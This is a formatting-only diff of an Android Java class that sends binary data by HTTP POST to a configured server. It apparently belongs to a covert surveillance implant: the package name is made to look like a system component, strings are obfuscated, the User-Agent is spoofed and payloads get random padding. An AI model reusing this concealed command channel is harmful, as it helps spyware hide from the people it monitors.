@@ -9,8 +9,10 @@
 
 package com.android.syssetup.action.sync;
 
-import java.io.DataInputStream;
-import java.io.IOException;
+import com.android.mm.M;
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.util.Check;
+import com.android.syssetup.util.Utils;
 
 import org.apache.http.HttpResponse;
 import org.apache.http.HttpStatus;
@@ -26,10 +28,8 @@ import org.apache.http.params.BasicHttpParams;
 import org.apache.http.params.HttpConnectionParams;
 import org.apache.http.params.HttpProtocolParams;
 
-import com.android.syssetup.auto.Cfg;
-import com.android.syssetup.util.Check;
-import com.android.syssetup.util.Utils;
-import com.android.mm.M;
+import java.io.DataInputStream;
+import java.io.IOException;
 
 public abstract class HttpKeepAliveTransport extends HttpTransport {
 	private static final String TAG = "HttpKeepAliveTransport"; //$NON-NLS-1$
@@ -45,12 +45,10 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 	/**
 	 * http://www.androidsnippets.com/executing-a-http-post-request-with-
 	 * httpclient
-	 * 
-	 * @param data
-	 *            the data
+	 *
+	 * @param data the data
 	 * @return the byte[]
-	 * @throws TransportException
-	 *             the transport exception
+	 * @throws TransportException the transport exception
 	 */
 	@Override
 	public synchronized byte[] command(byte[] data) throws TransportException {
@@ -67,7 +65,7 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 		final HttpPost httppost = new HttpPost(baseurl);
 
 		httppost.setHeader(M.e("User-Agent"), //$NON-NLS-1$
-		M.e("Mozilla/5.0 (Linux; U; Android 3.0; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Safari/533.1")); //$NON-NLS-1$
+				M.e("Mozilla/5.0 (Linux; U; Android 3.0; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Safari/533.1")); //$NON-NLS-1$
 		httppost.setHeader(M.e("Content-Type"), M.e("application/octet-stream")); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (cookies != null) {
@@ -79,21 +77,21 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 
 		DataInputStream in = null;
 		Statistics stat = null;
-		
+
 		try {
 
 			//RANDBLOCK
 			byte[] randBlock = Utils.getRandomByteArray(1, 16);
-			data = Utils.concat(data, randBlock);		
+			data = Utils.concat(data, randBlock);
 
 			httppost.setEntity(new ByteArrayEntity(data));
 
 			if (Cfg.STATISTICS) {
 				stat = new Statistics("httpclient", data.length);
 			}
-			
+
 			final HttpResponse response = httpclient.execute(httppost);
-			
+
 			if (Cfg.STATISTICS) {
 				stat.stop();
 			}
@@ -104,7 +102,7 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 				cookies = httpclient.getCookieStore().getCookies();
 
 				long length = response.getEntity().getContentLength();
-				
+
 				if (length % 16 > 0) {
 					/*
 					 * if (Cfg.DEBUG) { Check.log(TAG +
@@ -112,7 +110,7 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 					 */
 					length = length - (length % 16);
 				}
-				
+
 
 				in = new DataInputStream(response.getEntity().getContent());
 
@@ -170,12 +168,12 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 
 		BasicHttpParams httpParameters = new BasicHttpParams();
 		HttpProtocolParams.setVersion(httpParameters, HttpVersion.HTTP_1_1);
-		
+
 		// final HttpParams httpParameters = new BasicHttpParams();
 		// Set the timeout in milliseconds until a connection is established.
 		final int timeoutConnection = 120000;
 		HttpConnectionParams.setConnectionTimeout(httpParameters, timeoutConnection);
-		
+
 		// Set the default socket timeout (SO_TIMEOUT)
 		// in milliseconds which is the timeout for waiting for data.
 		final int timeoutSocket = 120000;
